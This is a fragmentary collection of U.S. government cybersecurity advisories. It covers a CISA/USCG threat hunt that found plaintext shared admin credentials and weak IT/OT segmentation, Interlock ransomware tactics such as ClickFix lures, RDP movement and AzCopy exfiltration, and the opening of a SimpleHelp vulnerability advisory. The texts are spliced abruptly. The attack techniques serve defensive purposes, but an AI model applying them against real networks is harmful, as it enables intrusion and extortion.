used:\n<ul>\n<li>Forward container logs (e.g., journald/systemd inside Guest Shell) to your SIEM.

    "summary": "\n<strong>Summary</strong>\n<p><em>The Cybersecurity and Infrastructure Security Agency (CISA) and U.S. Coast Guard (USCG) are issuing this Cybersecurity Advisory to present findings from a recent CISA and USCG hunt engagement. The purpose of this advisory is to highlight identified cybersecurity issues, thereby informing security defenders in other organizations of potential similar issues and encouraging them to take proactive measures to enhance their cybersecurity posture. This advisory has been coordinated with the organization involved in the hunt engagement.</em></p>\n<p>CISA led a proactive hunt engagement at a U.S. critical infrastructure organization with the support of USCG analysts. During hunts, CISA proactively searches for evidence of malicious activity or malicious cyber actor presence on customer networks. The organization invited CISA to conduct a proactive hunt to determine if an actor had been present in the organization’s environment. (<strong>Note:</strong> Henceforth, unless otherwise defined, “CISA” is used in this advisory to refer to the hunt team as an umbrella for both CISA and USCG analysts).</p>\n<p>During this engagement, CISA did not identify evidence of malicious cyber activity or actor presence on the organization’s network, but did identify cybersecurity risks, including:</p>\n<ul>\n<li>Insufficient logging;</li>\n<li>Insecurely stored credentials;</li>\n<li>Shared local administrator (admin) credentials across many workstations;</li>\n<li>Unrestricted remote access for local admin accounts;</li>\n<li>Insufficient network segmentation configuration between IT and operational technology (OT) assets; and</li>\n<li>Several device misconfigurations.</li>\n</ul>\n<p>In coordination with the organization where the hunt was conducted, CISA and USCG are sharing cybersecurity risk findings and associated mitigations to assist other critical infrastructure organizations with improving their cybersecurity posture. Recommendations are listed for each of CISA’s findings, as well as general practices to strengthen cybersecurity for OT environments. These mitigations align with CISA and the National Institute for Standards and Technology’s (NIST) <a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs\" title=\"Cross-Sector Cybersecurity Performance Goals (CPGs)\">Cross-Sector Cybersecurity Performance Goals (CPGs)</a>, and with mitigations provided in the USCG Cyber Command’s (CGCYBER) <a href=\"https://www.uscg.mil/Portals/0/Images/cyber/CGCYBER%202024%20CTIME.pdf?ver=AgbTrQoh4Fs91HUmdhd_xA%3d%3d&amp;timestamp=1747657640065\" target=\"_blank\" title=\"2024 Cyber Trends and Insights in the Marine Environment Report\">2024 Cyber Trends and Insights in the Marine Environment (CTIME) Report</a>.</p>\n\n<p>Although no malicious activity was identified during this engagement, critical infrastructure organizations are advised to review and implement the mitigations listed in this advisory to prevent potential compromises and better protect our national infrastructure. These mitigations include the following (listed in order of importance):</p>\n<ul>\n<li><strong>Do not store passwords or credentials in plaintext. </strong>Instead, <strong>use secure password and credential management solutions </strong>such as encrypted password vaults, managed service accounts, or built-in secure features of deployment tools.\n<ul>\n<li><strong>Ensure that all credentials are encrypted </strong>both at rest and in transit. Implement<strong> strict access controls and regular audits </strong>to securely manage scripts or tools accessing credentials.</li>\n<li>Use code reviews and automated scanning tools to<strong> detect and eliminate any instances of plaintext credentials on hosts or workstations.</strong></li>\n<li><strong>Enforce the principle of least privilege</strong>, only granting users and processes the access necessary to perform their functions.</li>\n</ul>\n</li>\n<li><strong>Avoid sharing local administrator account credentials. </strong>Instead,<strong> provision unique, complex passwords for each account </strong>using tools like Microsoft’s Local Administrator Password Solution (LAPS) that automate password management and rotation.</li>\n<li>Enforce <strong>multifactor authentication (MFA) for all administrative access</strong>, including local and domain accounts, and for remote access methods such as Remote Desktop Protocol (RDP) and virtual private network (VPN) connections.</li>\n<li>Implement and enforce strict policies to only <strong>use hardened bastion hosts isolated from IT networks equipped with phishing-resistant MFA to access industrial control systems (ICS)/OT networks</strong>, and ensure regular workstations (i.e., workstations used for accessing IT networks and applications) cannot be used to access ICS/OT networks.</li>\n<li><strong>Implement comprehensive (i.e., large coverage) and detailed logging across all systems</strong>, including workstations, servers, network devices, and security appliances.\n<ul>\n<li>Ensure logs <strong>capture information such as authentication attempts, command-line executions with arguments, and network connections</strong>.</li>\n<li><strong>Retain logs for an appropriate period to enable thorough historical analysis</strong> (adhering to organizational policies and compliance requirements) and <strong>aggregate logs in an out-of-band, centralized location</strong>, such as a security information event management (SIEM) tool, to protect them from tampering and facilitate efficient analysis.</li>\n</ul>\n</li>\n</ul>\n<p>For more detailed mitigations addressing the identified cybersecurity risks, see the <strong>Mitigations </strong>section of this advisory.</p>\n<p>Download the PDF version of this report:</p>\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-08/joint-advisory-cisa-identifies-areas-for-cyber-hygiene-improvement-after-conducting-proactive-threat-hunt-508c.pdf\" target=\"_blank\">AA25-212A CISA and USCG Identify Areas for Cyber Hygiene Improvement</a>\n(PDF,       537.67 KB\n  )\n\n\n<strong>Technical Details</strong>\n<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v17/matrices/enterprise/\" target=\"_blank\" title=\"MITRE ATT&amp;CK Matrix for Enterprise\">MITRE ATT&amp;CK® Matrix for Enterprise</a> framework, version 17. See <strong>Appendix: MITRE ATT&amp;CK Tactics and Techniques</strong> for a table of potential activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>\nOverview\n<p>Cybersecurity and Infrastructure Security Agency (CISA) and United States Coast Guard (USCG) analysts (collectively referred to as CISA in this report) conducted a threat hunt engagement at a critical infrastructure organization. During this hunt, CISA proactively searched for evidence of malicious activity or the presence of a malicious cyber actor on the customer’s network using host, network, industrial control system (ICS), and commercial cloud and open-source analysis tools. CISA searched for evidence of activity by looking for specific exploitation tactics, techniques, and procedures (TTPs) and associated artifacts.</p>\n<p>While CISA did not find evidence of threat actor presence on the organization’s network, the team did identify several cybersecurity risks. These findings are listed below in order of risk. Technical details of each identified cyber risk are included, along with the potential impact from threat actor exploitation of each risk (recommendations for mitigating each risk are listed in the Mitigations<strong> </strong>section below).</p>\n<p>Several of these findings align with those observed during similar engagements conducted by US Coast Guard Cyber Command (CGCYBER), which are documented in their <a href=\"https://www.uscg.mil/Portals/0/Images/cyber/CGCYBER%202024%20CTIME.pdf?ver=AgbTrQoh4Fs91HUmdhd_xA%3d%3d&amp;timestamp=1747657640065\" target=\"_blank\" title=\"Cyber Trends and Insights in the Marine Environment (CTIME) Report\">2024 Cyber Trends and Insights in the Marine Environment (CTIME)</a> report. The authoring agencies encourage critical infrastructure organizations to review the CTIME report to understand trends in the techniques/attack paths threat actors are using to compromise at-risk organizations, and what mitigations organizations should implement to prevent a successful attack.</p>\nKey Findings\n<strong>Shared Local Admin Accounts with Non-Unique Passwords Stored as Plaintext</strong>\n<p><strong>Details: </strong>CISA identified a few local admin accounts with non-unique passwords; these accounts were shared across many hosts. The credentials for each account were stored plaintext in batch scripts. CISA discovered these authorized scripts were configured to create user accounts with local admin privileges and then set identical, non-expiring passwords—these passwords were stored in plaintext in the script. One script was configured to create an admin account (set with a password stored in the script in plaintext) and automatically add to the admin group. The account was set as the local admin account on many other hosts.</p>\n<p><strong>Potential Impact: </strong>The storage of local admin credentials in plaintext scripts across numerous hosts increases the risk of widespread unauthorized access, and the usage of non-unique passwords facilitates lateral movement throughout the network. Malicious actors with access to workstations with either of these batch scripts could obtain the passwords for these local admin accounts by searching the filesystem for strings like <code>net user /add</code>, identifying scripts containing usernames and passwords [<a href=\"https://attack.mitre.org/versions/v16/techniques/T1552/001/\" target=\"_blank\" title=\"T1552.001\">T1552.001</a>], and accessing these accounts to move laterally.</p>\n<p>For example, during a controlled security validation exercise (with explicit permission from the customer), CISA used the credentials found in one of the scripts to log into its associated admin account locally on a workstation [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1078/003/\" target=\"_blank\" title=\"T1078.003\">T1078.003</a>], and then establish a Remote Desktop Protocol (RDP) connection to another workstation [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1021/001/\" target=\"_blank\" title=\"T1021.001\">T1021.001</a>]. This demonstrated that the credentials allowed local login to an admin account and enabled lateral movement to any workstation with the account. While using this account, the user had local admin privileges on many workstations. Upon initiating the RDP session, the system issued out a notification that another user was currently logged in and that continuing the session would disconnect the existing user, confirming that the account can be accessed remotely via RDP.</p>\n<p>The uniform use of local admin accounts with identical, non-expiring passwords across numerous hosts, coupled with the storage of these credentials in plaintext within accessible scripts, elevates the risk of unauthorized access and lateral movement throughout the network.</p>\n<p>With local admin access, malicious cyber actors can:</p>\n<ul>\n<li>Modify existing accounts or create new accounts [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1098/\" target=\"_blank\" title=\"T1098\">T1098</a>], potentially escalating privileges or maintaining persistent access.</li>\n<li>Install malicious browser extensions on compromised systems [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1112/\" target=\"_blank\" title=\"T1112\">T1112</a>].</li>\n<li>Communicate with compromised systems using standard application layer protocols [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1071/\" target=\"_blank\" title=\"T1071\">T1071</a>], which may bypass certain security monitoring tools.</li>\n<li>Modify local policies to escalate privileges or disable security features [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1484/\" target=\"_blank\" title=\"T1484\">T1484</a>].</li>\n<li>Alter system configurations or install software that executes at startup [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1547/\" target=\"_blank\" title=\"T1547\">T1547</a>], ensuring continued access and persistence.</li>\n<li>Hijack the execution flow of applications to inject malicious code [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1574/\" target=\"_blank\" title=\"T1574\">T1574</a>].</li>\n</ul>\n<p>The widespread distribution of plaintext credentials and the use of identical passwords across hosts increases the risk of unauthorized access throughout the network. This vulnerability heightens the potential for attackers to conduct unauthorized activities, which may impact the confidentiality, integrity, and availability of the organization’s assets.</p>\n<p><strong>Note:</strong> This finding was associated with workstations only; servers and other devices were not affected.</p>\n<strong>Insufficient Network Segmentation Configuration Between IT and Operational Technology Environments</strong>\n<p><strong>Details:</strong> While assessing interconnectivity between the customer’s IT and operational technology (OT) environments, CISA identified that the OT environment was not properly configured. Specifically, standard user accounts could directly access the supervisory control and data acquisition (SCADA) virtual local area network (VLAN) directly from IT hosts.</p>\n<p>First, CISA determined it was possible to establish a connection via port <code>21</code> from a user workstation in the IT network to a system within the SCADA VLAN. The test established that a network path was available, the remote host was reachable, the port was open and listening for connections, and that the port was directly accessible between the IT and SCADA VLANs, with misconfigured network-level restrictions—for example, firewalls or access control lists (ACLs)—blocking the Transmission Control Protocol (TCP) connection on the port. This test was conducted using a standard user account on a regular IT workstation without administrative privileges [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/\" target=\"_blank\" title=\"T1078\">T1078</a>].</p>\n<p>Second, CISA discovered that the customer did not have sufficient secured bastion hosts dedicated for accessing SCADA and heating, ventilation, and air conditioning (HVAC) systems. A bastion host­—sometimes referred to as a jump box or jump server—is a specialized, highly secured system (often a server or dedicated workstation) that serves as the sole access point between a network segment (such as an internal IT network) and a protected internal network (like an OT or ICS environment). By inspecting and filtering all inbound and outbound traffic, a bastion host is designed to prevent unauthorized access and lateral movement, ensuring that only authenticated and authorized users can interact with internal systems. Though several hosts were designated as bastion hosts for remote access to SCADA and HVAC systems, they lacked the enhanced security configuration, dedicated monitoring, and specialized scrutiny expected of bastion hosts.</p>\n<p><strong>Potential Impact: </strong>Insufficient OT network segmentation configuration, network access control (NAC), and the ability of a non-privileged user within the IT network to use their credentials to access the critical SCADA VLAN [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1078/\" target=\"_blank\" title=\"T1078\">T1078</a>] presents a security and safety risk. Given that SCADA and HVAC systems control physical processes, compromises of these systems can have real-world consequences, including risks to personnel safety, infrastructure integrity, and equipment functionality.</p>\n<p>Malicious actors could further exploit potentially unsecured workstations with access to OT systems, and insufficient network segmentation configuration between IT and OT systems, in the following ways:</p>\n<ul>\n<li>Use RDP or Secure Shell (SSH) protocols to move laterally from compromised IT workstations to OT systems [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1021/001/\" target=\"_blank\" title=\"T1021.001\">T1021.001</a>] [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1021/004/\" target=\"_blank\" title=\"T1021.004\">T1021.004</a>].</li>\n<li>Execute commands and scripts using scripting languages like PowerShell to attack OT systems [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1059/\" target=\"_blank\" title=\"T1059\">T1059</a>].</li>\n<li>Map network connections to identify paths to OT systems [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1049/\" target=\"_blank\" title=\"T1049\">T1049</a>].</li>\n<li>Gather information about network configurations to plan attacks on OT systems [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1016/\" target=\"_blank\" title=\"T1016\">T1016</a>].</li>\n</ul>\n<p>By exploiting these weaknesses, attackers can potentially gain unauthorized access to critical OT systems, manipulate physical processes, disrupt operations, and cause harm.</p>\n<strong>Insufficient Log Retention and Implementation</strong>\n<p><strong>Details:</strong> CISA was unable to hunt for every MITRE ATT&amp;CK® procedure in the scoped hunt plan partly because the organization’s event logging system was insufficient for this analysis. For example, Windows event logs from workstations were not being forwarded to the organization’s security information event management (SIEM), verbose command line auditing was not enabled (meaning command line arguments were not being captured in Event ID <code>4688</code>), logging in the SIEM was not as comprehensive as required for the analysis, and log retention did not allow for a thorough analysis of historical activity.</p>\n<p><strong>Potential Impact: </strong>The absence of comprehensive and detailed logs, along with a lack of an established baseline for normal network behavior, prevented CISA from performing thorough behavior and anomaly-based detection. This limitation hindered the ability to hunt for certain TTPs, such as <a href=\"https://www.cisa.gov/resources-tools/resources/identifying-and-mitigating-living-land-techniques\">living-off-the-land techniques,</a> the use of valid accounts [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1078/\" target=\"_blank\" title=\"T1078\">T1078</a>], and other TTPs used by sophisticated threat actors. Such techniques often do not produce discrete indicators of compromise or trigger alerts from antivirus software, intrusion detection systems (IDS), or endpoint detection and response (EDR) solutions. Further, the lack of workstation logs in the organization’s SIEM meant CISA could not analyze authentication events to identify anomalous activities, such as unauthorized access using local administrator credentials. This gap exposes networks to undetected lateral movement and unauthorized access.</p>\n<p>Insufficient logging can prevent the detection of malicious activity by hindering investigations, which makes detection of threat actors more challenging and leaves the network susceptible to undetected threats.</p>\nAdditional Findings\n<strong>Misconfigured sslFlags on a Production Server</strong>\n<p><strong>Details:</strong> CISA used PowerShell to examine the <code>ApplicationHost.config</code> file[<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-212a#_ftnref1\" title=\"Footnote Reference 1\">1</a>]—a central configuration file for Internet Information Services (IIS) that governs the behavior of the web server and its applications and websites—on a production IIS server. CISA observed an HTTPS binding configured with <code>sslFlags==“0”</code>, which keeps IIS in its legacy “one-certificate-per-IP” mode. This mode disables modern certificate-management features, and because mutual Transport Layer Security (TLS) (client-certificate authentication) must be enabled separately in “SSL Settings” or by adding <code>&lt;access sslFlags=“Ssl, SslRequireCert” /&gt;</code>, the binding leaves the client-certificate enforcement off by default, allowing any TLS client to complete the handshake anonymously. Moreover, <code>sslFlags</code> does not control protocol or cipher selection, so outdated protocols or weak cipher suites (e.g., SSL 3.0, TLS 1.0/1.1) may still be accepted unless Secure Channel (Schannel)[<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-212a#_ftnref2\" title=\"Footnote Reference 2\">2</a>] has been explicitly hardened.</p>\n<p><strong>Potential Impact: </strong>The misconfigured <code>sslFlags</code> could enable threat actors to attempt an adversary-in-the-middle attack [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1557/\" target=\"_blank\" title=\"T1557\">T1557</a>] to intercept credentials and data transmitted between clients and the IIS server. Malicious actors could also exploit vulnerabilities in older Secure Sockets Layer (SSL)/TLS protocols, as well as weak cipher suites, increasing the risk for protocol downgrade attacks in which an attacker forces the server and client to negotiate the use of weaker encryption standards [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1562/010/\" target=\"_blank\" title=\"T1562.010\">T1562.010</a>]. This compromises the confidentiality and integrity of data transmitted over this channel. Furthermore, the absence of client certificate enforcement meant the server did not validate the identity of the connecting clients beyond the basic SSL/TLS handshake. This deficiency exposed the server to risks where unauthorized or malicious clients could impersonate legitimate users, potentially gaining access to sensitive resources without proper verification.</p>\n<strong>Misconfigured Structured Query Language Connections on a Production Server</strong>\n<p><strong>Details: </strong>CISA reviewed <code>machine.config</code> file on a production server and identified that it was configured with a centralized database connection string, <code>LocalSqlServer</code>, for both profile and role providers. This configuration implies that, unless overridden in each application’s <code>web.config</code> files, every ASP.NET site on the server connects to the same Structured Query Language (SQL) Express or <code>aspnetdb</code> database and shares the same credentials context.</p>\n<p>Additionally, CISA identified that the <code>machine.config</code> file set the <code>minRequiredPasswordLength</code> to be less than 15 characters, which is <a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#MinimumPasswordStrength2B\" title=\"CISA’s recommended password length\">CISA’s recommended password length</a>.</p>\n<p><strong>Potential Impact: Using a centralized database approach </strong>increases risk, as a single breach or misconfiguration in this central SQL database server can compromise <strong>all </strong>applications dependent on the server. This creates a single point of failure and could be exploited by attackers aiming to gain broad access to the system.</p>\n<p>Additionally, setting the minimum password length to any password under 15 characters is more vulnerable to various forms of brute-force attacks, such as password guessing [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1110/001/\" target=\"_blank\" title=\"T1110.001\">T1110.001</a>], cracking [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1110/002/\" target=\"_blank\" title=\"T1110.002\">T1110.002</a>], spraying [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1110/003/\" target=\"_blank\" title=\"T1110.003\">T1110.003</a>], and credential stuffing [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1110/004/\" target=\"_blank\" title=\"T1110.004\">T1110.004</a>]. If a threat actor successfully cracked these weak passwords, they could gain unauthorized access to user or application accounts and leverage vulnerabilities within applications to further escalate privileges, potentially leading to unauthorized access to the backend SQL Server databases. This could result in data breaches, data manipulation, or a loss of database integrity.</p>\n<strong>Mitigations</strong>\n<p>CISA and USCG recommend that critical infrastructure organizations implement the mitigations below to improve their organization’s cybersecurity posture.

Using RDP without strong authentication practices can lead to credential theft.

FBI maintains these actors target their victims based on opportunity, and their activity is financially motivated. FBI is aware of Interlock ransomware encryptors designed for both Windows and Linux operating systems; these encryptors have been observed encrypting virtual machines (VMs) across both operating systems. FBI observed actors obtaining initial access via drive-by download from compromised legitimate websites, which is an uncommon method among ransomware groups. Actors were also observed using the ClickFix social engineering technique for initial access, in which victims are tricked into executing a malicious payload under the guise of fixing an issue on the victim’s system. Actors then use various methods for discovery, credential access, and lateral movement to spread to other systems on the network.</p>\n<p>Interlock actors employ a double extortion model in which actors encrypt systems after exfiltrating data, which increases pressure on victims to pay the ransom to both get their data decrypted and prevent it from being leaked. </p>\n<p>FBI, CISA, HHS, and MS-ISAC encourage organizations to implement the recommendations in the <strong>Mitigations</strong> section of this advisory to reduce the likelihood and impact of Interlock ransomware incidents.</p>\n<p>Download the PDF version of this report:</p>\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-07/aa25-203a-stopransomware-interlock-072225.pdf\" target=\"_blank\">AA25 203A StopRansomware Interlock</a>\n(PDF,       727.00 KB\n  )\n\n\n<p>For a downloadable copy of IOCs, see:</p>\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-07/AA25-203A-interlock-stix.xml\" target=\"_blank\">AA25-203A Interlock STIX XML</a>\n(XML,       63.69 KB\n  )\n\n\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-07/AA25-203A-interlock-stix.json\" target=\"_blank\">AA25 203A Interlock STIX JSON</a>\n(JSON,       57.47 KB\n  )\n\n\n<a><strong>Technical Details</strong></a>\n<p><strong>Note</strong>: This advisory uses the <a href=\"https://attack.mitre.org/versions/v17/matrices/enterprise/\" target=\"_blank\" title=\"MITRE ATT&amp;CK Matrix for Enterprises\">MITRE ATT&amp;CK® Matrix for Enterprise</a> framework, version 17. See the <strong>MITRE ATT&amp;CK Tactics and Techniques</strong> section of this advisory for tables mapped to the threat actors’ activity.</p>\n<a>Overview</a>\n<p>Since September 2024, Interlock ransomware actors have impacted a wide range of businesses and critical infrastructure sectors in North America and Europe. These actors are opportunistic and financially motivated in nature and employ tactics to infiltrate and disrupt the victim’s ability to provide their essential services. </p>\n<p>Interlock actors leverage a double extortion model, in which they both encrypt and exfiltrate victim data. Ransom notes do not include an initial ransom demand or payment instructions; instead, victims are provided with a unique code and are instructed to contact the ransomware group via a <code>.onion</code> URL through the Tor browser. To date, Interlock actors have been observed encrypting VMs, leaving hosts, workstations, and physical servers unaffected; however, this does not mean they will not expand to these systems in the future. To counter Interlock actors’ threat to VMs, enterprise defenders should implement robust endpoint detection and response (EDR) tooling and capabilities.</p>\n<p>The authoring agencies are aware of emerging open-source reporting detailing similarities between the Rhysida and Interlock ransomware variants.<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-203a#note1\">1</a> For additional information on Rhysida ransomware, see the joint advisory, <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-319a\" title=\"#StopRansomware: Rhysida Ransomware\">#StopRansomware: Rhy</a><a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-319a#StopRansomware:\" title=\"#StopRansomware: Rhysida Ransomware\">sida Ransomware</a><a href=\"https://www.cisa.gov/#StopRansomware:\">.</a></p>\n<a>Initial Access</a>\n<p>FBI has observed Interlock actors obtaining initial access [<a href=\"https://attack.mitre.org/versions/v17/tactics/TA0001/\" target=\"_blank\">TA0001</a>] via drive-by download [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1189/\" target=\"_blank\">T1189</a>] from compromised legitimate websites, an atypical method for ransomware actors. Interlock ransomware methods for initial access have previously disguised malicious payloads as fake Google Chrome or Microsoft Edge browser updates, though a cybersecurity company recently reported a shift to payload filenames masquerading as updates for common security software (see Table 5 for a list of filenames).<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-203a#note2\">2</a></p>\n<p>In some instances, FBI has observed Interlock actors using the ClickFix social engineering technique, in which unsuspecting users are prompted to execute a malicious payload by clicking a fake Completely Automated Public Turing test to tell Computers and Humans Apart (CAPTCHA) [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1189/\" target=\"_blank\">T1189</a>]. The CAPTCHA contains instructions for users to open the Windows Run window, paste the clipboard contents, and then execute a malicious Base64-encoded PowerShell process [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1204/004/\" target=\"_blank\">T1204.004</a>].<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-203a#note3\">3</a></p>\n<p><strong>Note</strong>: This ClickFix technique has been used in several other malware campaigns, including Lumma Stealer and DarkGate.<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-203a#note4\">4</a></p>\n<a>Execution and Persistence</a>\n<p>Based on FBI investigations, the fake Google Chrome browser executable functions as a remote access trojan (RAT) [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1105/\" target=\"_blank\">T1105</a>] designed to execute a PowerShell script [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1059/001/\" target=\"_blank\">T1059.001</a>] that drops a file into the Windows Startup folder.

They also use tools like AnyDesk to enable remote connectivity and PuTTY to assist with lateral movement [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1219/\" target=\"_blank\">T1219</a>].<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-203a#note11\">11</a> In addition to stealing users’ online credentials, Interlock actors have compromised domain administrator accounts (possibly by using a Kerberoasting attack [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1558/003/\" target=\"_blank\">T1558.003</a>])<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-203a#note12\">12</a> to gain additional privileges [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1078/002/\" target=\"_blank\">T1078.002</a>]. </p>\n<a>Collection and Exfiltration</a>\n<p>Interlock actors leverage Azure Storage Explorer (<code>StorageExplorer.exe</code>) to navigate victims’ Microsoft Azure Storage accounts [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1530/\" target=\"_blank\">T1530</a>] prior to exfiltrating data. According to open source reporting, Interlock actors execute AzCopy to exfiltrate data by uploading it to the Azure storage blob [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1567/002/\" target=\"_blank\">T1567.002</a>].<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-203a#note13\">13</a> Interlock actors also exfiltrate data over file transfer tools, including WinSCP [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1048/\" target=\"_blank\">T1048</a>].</p>\n<a>Impact</a>\n<p>Following data exfiltration, Interlock actors deploy the encryption binary as a 64-bit executable named <code>conhost.exe</code> [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1486/\" target=\"_blank\">T1486</a>],[<a href=\"https://attack.mitre.org/versions/v17/techniques/T1036/005/\" target=\"_blank\">T1036.005</a>]. FBI has observed Interlock ransomware encryptors for both Windows and Linux operating systems. Encryptors are designed to encrypt files using a combined Advanced Encryption Standard (AES) and Rivest-Shamir-Adleman (RSA) algorithm. In addition, cybersecurity researchers have identified Interlock ransomware samples using a FreeBSD ELF encryptor [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1486/\" target=\"_blank\">T1486</a>], a departure from usual Linux encryptors designed for VMware ESXi servers and VMs.<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-203a#note14\">14</a></p>\n<p>A cybersecurity company identified a DLL binary named <code>tmp41.wasd</code>—executed after encryption using <code>rundll32.exe</code> [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1218/011/\" target=\"_blank\">T1218.011</a>]—which uses the <code>remove()</code> function to delete the encryption binary [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1070/004/\" target=\"_blank\">T1070.004</a>];<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-203a#note15\">15</a> on Linux machines, the encryptor uses a similar technique to execute the <code>removeme</code> function. </p>\n<p>Encrypted files are appended with either <code>a .interlock</code> or <code>.1nt3rlock</code> file extension, alongside a ransom note titled <code>!__README__!.txt</code> delivered via group policy object (GPO). Interlock actors use a double-extortion model [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1657/\" target=\"_blank\">T1657</a>], encrypting systems after exfiltrating data. The ransom note provides each victim with a unique code and instructions to contact the ransomware actors via a <code>.onion</code> URL. </p>\n<p>Interlock actors do not leave an initial ransom demand or payment instructions on compromised networks, and do not relay this information until contacted by the victim. The actors instruct victims to make ransom payments in Bitcoin to cryptocurrency wallet addresses provided by the actors. The actors threaten to publish the victim’s exfiltrated data to their leak site on the Tor network unless the victim pays the ransom demand; the actors have previously followed through on this threat.<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-203a#note16\">16</a></p>\n<a><strong>Leveraged Tools</strong></a>\n<p>See <strong>Table 2</strong> for publicly available tools and applications used by Interlock ransomware actors. This includes legitimate tools repurposed for their operations.</p>\n<p><strong>Disclaimer</strong>: Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>\n\nTable 2. Tools Used by Interlock Ransomware Actors\n\n\nTool Name\nDescription\n\n\n\n\nAnyDesk\nA common legitimate remote monitoring and management (RMM) tool maliciously used by Interlock actors to obtain remote access and maintain persistence. AnyDesk also supports remote file transfer.\n\n\nCobalt Strike\nA penetration testing tool used by security professionals to test the security of networks and systems.\n\n\nPowerShell\nA cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.\n\n\nPSExec\nA tool designed to run programs and execute commands on remote systems.\n\n\nPuTTY.exe\nAn open source file transfer application commonly used to remotely connect to systems via Secure Shell (SSH). PuTTY also supports file transfer protocols like Secure File Transfer Protocol (SFTP) and Secure Copy Protocol (SCP).\n\n\nScreenConnect\nA remote support, access, and meeting software that allows users to control devices remotely over the internet. CISA observed Interlock actors using a cracked version of this software in at least one incident. These versions may be standalone versions not connecting to ScreenConnect’s official cloud domains (domains available upon request from ConnectWise).\n\n\nSystemBC\nEnables Interlock actors to compromise systems, run commands, download malicious payloads, and act as a proxy tool to the actors’ C2 servers.\n\n\nWindows Console Host\nWindows Console Host (<code>conhost.exe</code>) manages the user interface for command-line applications in Windows, including Command Prompt and PowerShell. \n\n\nWinSCP\nA free and open source SSH File Transfer Protocol (FTP), WebDAV, Amazon S3, and secure copy protocol client.\n\n\n\n<a><strong>Leveraged Files</strong></a>\n<p>See <strong>Table 3</strong> and <strong>Table 4 </strong>for files used by Interlock ransomware actors.

    "summary": "<strong>Summary</strong>\n<p>The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this advisory in response to ransomware actors leveraging unpatched instances of a vulnerability in SimpleHelp Remote Monitoring and Management (RMM) to compromise customers of a utility billing software provider. This incident reflects a broader pattern of ransomware actors targeting organizations through unpatched versions of SimpleHelp RMM since January 2025.</p>\n<p>SimpleHelp versions 5.5.7 and earlier contain several vulnerabilities, including <a href=\"https://www.cve.org/CVERecord?id=CVE-2024-57727\" target=\"_blank\" title=\"CVE-2024-57727\">CVE-2024-57727</a>—a path traversal vulnerability.<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a#note1\" title=\"Note1\">1</a> Ransomware actors likely leveraged CVE-2024-57727 to access downstream customers’ unpatched SimpleHelp RMM for disruption of services in double extortion compromises.<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a#note1\" title=\"Note 1\">1</a> </p>\n<p>CISA added CVE-2024-57727 to its <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities (KEV) Catalog</a> on Feb. 13, 2025.</p>\n<p>CISA urges software vendors, downstream customers, and end users to immediately implement the <strong>Mitigations </strong>listed in this advisory based on confirmed compromise or risk of compromise.</p>\n<p>Download the PDF version of this report:</p>\n\n\n<a 